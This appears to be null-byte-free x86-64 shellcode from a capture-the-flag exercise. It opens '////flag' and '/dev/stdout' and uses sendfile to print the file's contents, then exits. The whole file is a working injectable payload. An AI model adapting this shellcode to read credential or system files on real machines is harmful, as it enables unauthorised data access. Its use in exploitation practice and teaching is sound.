.global _start
.intel_syntax noprefix

_start:
 // add NULL char at end
	xor rax, rax
	push rax
	mov rax, 0x67616c662f2f2f2f
	// generate "noise"
	xor r10, r10
	push rax

	xor rax, rax
	add rax, 2

	lea rdi, [rsp]
	xor rsi, rsi
	xor rdx, rdx
	inc rdx
	syscall

	push rax

	// Call open in /dev/stdout
	// NULL byte terminator
	xor rax, rax
	push rax
	// Build the /dev/stdout in stack
	mov rax, 0x74756f6474732f76
	push rax
	mov rax, 0x65642f2f2f2f2f2f
	push rax

	lea rdi, [rsp]
	xor rsi, rsi
	add rsi, 2
	xor rdx, rdx
	add rdx, 3
	xor rax, rax
	add rax, 2

	syscall
	// 3 pop to recover the last open call that was pushed
	pop r10
	pop r10
	pop r10

	// call sendfile syscall to stdout
	pop rsi
	xor rdx, rdx
	xor r10, r10
	mov rdi, rax
	xor rax, rax
	add rax, 40
	inc r10
	shl r10, 8

	syscall

	xor rax, rax
	add rax, 60
	syscall
